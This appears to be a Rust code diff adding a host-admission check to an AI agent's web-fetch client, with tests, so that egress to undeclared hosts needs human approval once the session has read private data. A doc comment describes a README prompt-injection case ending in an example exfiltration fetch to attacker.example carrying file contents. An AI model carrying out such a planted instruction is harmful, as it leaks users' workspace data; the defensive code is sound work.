@@ -216,6 +216,47 @@ pub fn build_web_fetch_client(
         .build()
 }
 
+/// Where an agent-built URL may carry the request it encodes.
+///
+/// A URL is data leaving the session: its path and query are chosen by the agent,
+/// after whatever the agent has read. Workspace reads are `Internal`, and the web
+/// sink's ceiling admits `Internal` (`sink_max_conf_for`), so information flow
+/// control alone lets a read reach any host. The host is what bounds it. A declared
+/// host (`network.dns_allow`) is one the principal chose to send workspace-derived
+/// data to. With no allowlist, a session that has read nothing above `Public` is
+/// open research. Once it has, an undeclared host is a channel nobody chose, and a
+/// human decides. This is the README-injection shape: an instruction planted in a
+/// workspace file, then `fetch attacker.example/?d=<file contents>`, needs no
+/// untrusted fetch to arrive first.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum HostAdmission {
+    /// The host is in a non-empty `dns_allow`.
+    Declared,
+    /// No allowlist, and the session holds nothing above `Public`.
+    Open,
+    /// No allowlist, and the session holds data above `Public`. The value is the
+    /// approval key, `web_egress <host>:<port>`: one name for one decision.
+    NeedsApproval(String),
+}
+
+/// Admit `host:port` for a fetch. `Err` is an undeclared host under a non-empty
+/// allowlist, exactly as [`check_dns_allowlist`] refuses it.
+pub fn admit_host(
+    dns_allow: &[String],
+    host: &str,
+    port: u16,
+    holds_private: bool,
+) -> Result<HostAdmission, String> {
+    if !dns_allow.is_empty() {
+        return check_dns_allowlist(dns_allow, host, port).map(|()| HostAdmission::Declared);
+    }
+    Ok(if holds_private {
+        HostAdmission::NeedsApproval(format!("web_egress {host}:{port}"))
+    } else {
+        HostAdmission::Open
+    })
+}
+
 /// Validate the final URL after redirects against the DNS allowlist.
 /// This prevents open-redirect bypass attacks where an allowlisted domain
 /// redirects to a non-allowlisted domain.
@@ -266,6 +307,32 @@ pub(crate) async fn read_body_capped(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_declared_host_is_admitted_whatever_the_session_holds() {
+        let allow = vec!["docs.example".to_owned()];
+        for private in [false, true] {
+            assert_eq!(
+                admit_host(&allow, "docs.example", 443, private),
+                Ok(HostAdmission::Declared)
+            );
+        }
+        assert!(admit_host(&allow, "attacker.example", 443, false).is_err());
+    }
+
+    #[test]
+    fn without_an_allowlist_private_data_makes_egress_a_human_decision() {
+        assert_eq!(
+            admit_host(&[], "attacker.example", 443, false),
+            Ok(HostAdmission::Open)
+        );
+        assert_eq!(
+            admit_host(&[], "attacker.example", 443, true),
+            Ok(HostAdmission::NeedsApproval(
+                "web_egress attacker.example:443".to_owned()
+            ))
+        );
+    }
 
     #[test]
     fn test_dns_allowlist_host_only() {
